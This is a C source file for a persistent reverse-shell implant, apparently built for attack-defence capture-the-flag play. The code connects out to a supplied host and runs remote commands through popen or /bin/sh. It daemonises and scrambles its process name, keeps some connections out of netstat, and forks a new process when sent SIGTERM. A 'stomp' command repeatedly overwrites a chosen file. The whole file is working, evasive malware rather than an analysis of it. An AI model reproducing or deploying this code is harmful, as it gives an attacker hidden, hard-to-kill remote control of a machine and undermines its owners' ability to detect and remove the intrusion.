#define _GNU_SOURCE

#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define BUF_SIZE 4096

#include "reverse.h"
#include "util.h"
const char *PROC_NET_TCP = "/proc/net/tcp";
const char *PWNCAT_INIT = " echo; echo ";
const char *CMD_POSTFIX = " 2>&1";

////////////////////////////////////////////////////////////////////////////////////////////////////
// Forward declarations
void handle_stomp(int sock, char *input, size_t len);
void handle_cmd(int sock, char *input, size_t len);
void reverse_shell_classic(int sock, char *shell, char *cmd);
int num_current_connections(const char *host, unsigned int port);
void sigterm_handler(int signal);

////////////////////////////////////////////////////////////////////////////////////////////////////
// Implementation

void reverse_shell(const char *host, unsigned int port, unsigned int num_shells) {
    int sock;
    char input[BUF_SIZE];
    struct sockaddr_in client;

    client.sin_family = AF_INET;
    client.sin_addr.s_addr = inet_addr(host);
    client.sin_port = htons(port);

    // Define a SIGTERM handler to sneakily spin up a new lifeline
    signal(SIGTERM, sigterm_handler);

    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        // Try connecting every few seconds.
        // Our listener might not always be available
        // If we set a shell limit, keep waiting until we have a free slot
        //
        // BUG; sure, this doesn't do any fancy mutual exclusion, but it should at
        // least hide some of our lifelines by keeping them out of netstat.
        int conn = -1;
        while (conn != 0) {
            if (num_shells == 0 || num_current_connections(host, port) < num_shells) {
                conn = connect(sock, (struct sockaddr *)&client, sizeof(client));
            }
            // If we didn't establish a connection in the previous step, sleep for a bit
            if (conn != 0) {
                sleep(5);
            }
        }

        // Fork on successful connection, as this shell will now stand out like a sore thumb
        // TODO; This does mean that new shells are spawned on each reconnect, but I haven't decided
        // yet whether that's something I want to prevent or whether I can play it off as a feature.
        // The fix would be to not reconnect after the socket read loop exits
        if (fork() != 0) {
            daemon(0, 0);
            scramble_process_name(time(NULL));
            continue;
        }

        // Send a message to indicate a socket just connected.
        // Helpful when using a simple `nc` listener
        send(sock, "Connected!\n", strlen("Connected!\n"), 0);

        int firstCommand = 1;
        size_t len = 0;
        while ((len = read(sock, input, sizeof(input) - sizeof(CMD_POSTFIX) - 1)) > 0) {
            // Hacky pwncat compatibility. pwncat sends an empty echo, followed by an echo with
            // a random string.
            // I'm assuming that most users won't chain echo's together like that
            if (firstCommand && strncmp(PWNCAT_INIT, input, strlen(PWNCAT_INIT)) == 0) {
                // Cut the command at the newline
                char *enter = strstr(input, "\n");
                *enter = 0x00;
                // Break into a reverse shell and execute the command we just received
                reverse_shell_classic(sock, "/bin/bash", input);
                break;
            }
            // "!shell" drops you into a more "usable" shell
            if (strncmp("!shell", input, 6) == 0) {
                // Call will create a new process that uses `sock` as a reverse shell.
                reverse_shell_classic(sock, "/bin/sh", NULL);
                // Our parent process needs to break out of this while loop to free up `sock`.
                // This will cause the parent process to begin monitoring /proc/net/tcp again
                break;
            } else if (strncmp("!stomp", input, 6) == 0) {
                handle_stomp(sock, input, len);
            } else {
                handle_cmd(sock, input, len);
            }
            firstCommand = 0;
        }
        close(sock);
    }
}

void handle_stomp(int sock, char *input, size_t len) {
    if (len < 1) {
        send(sock, "Invalid len\n", sizeof("Invalid len\n"), 0);
        return;
    }
    input[len - 1] = 0x00;

    char *p_file_path = strstr(input, " ");
    if (!p_file_path) {
        send(sock, "Invalid number of arguments\n", sizeof("Invalid number of arguments\n"), 0);
        return;
    }
    p_file_path++; // skip the space.

    char *p_file_content = strstr(p_file_path, " ");
    if (!p_file_content) {
        send(sock, "Invalid number of arguments\n", sizeof("Invalid number of arguments\n"), 0);
        return;
    }
    p_file_content++; // skip the space.

    size_t path_len = (p_file_content - p_file_path) - 1;
    size_t content_len = (p_file_content - (input + len));
    char *file_path = strndup(p_file_path, path_len);
    char *file_content = strndup(p_file_content, content_len);

    if (!file_path || !file_content) {
        send(sock, "alloc fail\n", sizeof("alloc fail\n"), 0);
        return;
    }

    dprintf(sock, "Stomping >%s< with content: >%s<\n", file_path, file_content);
    if (fork() != 0) {
        daemon(0, 0);
        scramble_process_name(time(NULL));
        stomp_flag_loop(file_path, file_content);
    }
}

void handle_cmd(int sock, char *input, size_t len) {
    char output[BUF_SIZE];
    // Add a postfix to the command to redirect stderr to stdout, s.t.
    // it is also picked up by fgets
    char *enter = strstr(input, "\n");
    strncpy(enter, CMD_POSTFIX, BUF_SIZE - (enter - input));
    FILE *fp = popen(input, "r");
    while (fgets(output, sizeof(output), fp) != NULL) {
        send(sock, output, strlen(output) + 1, 0);
    }
    pclose(fp);
}

void reverse_shell_classic(int sock, char *shell, char *cmd) {
    // Construct a string that looks like "cmd; shell"
    char cmd_shell[BUF_SIZE];
    if (cmd) {
        snprintf(cmd_shell, BUF_SIZE, "%s; %s", cmd, shell);
    } else {
        // If we didn't receive a command to execute, just launch the shell
        snprintf(cmd_shell, BUF_SIZE, "%s", shell);
    }

    // Create a fork s.t. one process will be replaced by a shell,
    // while the other one can return to the reconnect loop
    int pid = fork();
    if (pid == 0) {
        daemon(0, 0);
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        // execute the command, then drop in to a reverse shell
        char *args[] = {shell, "-c", cmd_shell, NULL};
        execv(args[0], args);
    }
}

// Read the current number of reverse shells we've got going at the moment.
//
// Can be used to keep other lifeline threads hidden by not causing net traffic
int num_current_connections(const char *host, unsigned int port) {
    unsigned int occurrences = 0;

    int host_int = inet_addr(host);

    FILE *tcp_file = fopen(PROC_NET_TCP, "r");
    if (tcp_file == NULL) {
        return -1;
    }
    char line[256];

    unsigned int i = 0;
    while (fgets(line, sizeof(line), tcp_file) != NULL) {
        // First line skipped, since it's a header
        if (i != 0) {
            int line_host, line_port, state;
            sscanf(line, "%*d: %*X:%*X %X:%X %X %*512s\n", &line_host, &line_port, &state);
            // ... We want to spin up a new shell if we're not in ESTABLISHED, SYN_RECEIVED or
            // SYN_SEND
            if (line_host == host_int && line_port == port &&
                (state == 1 || state == 2 || state == 3)) {
                occurrences += 1;
            }
        }
        i += 1;
    }
    return occurrences;
}

// On Sigterm --> Fork and continue under a new PID
void sigterm_handler(int signal) {
    if (fork() == 0) {
        daemon(0, 0);
        return;
    }
    // Let PID that receive the sigterm exit
    pthread_exit(0);
}
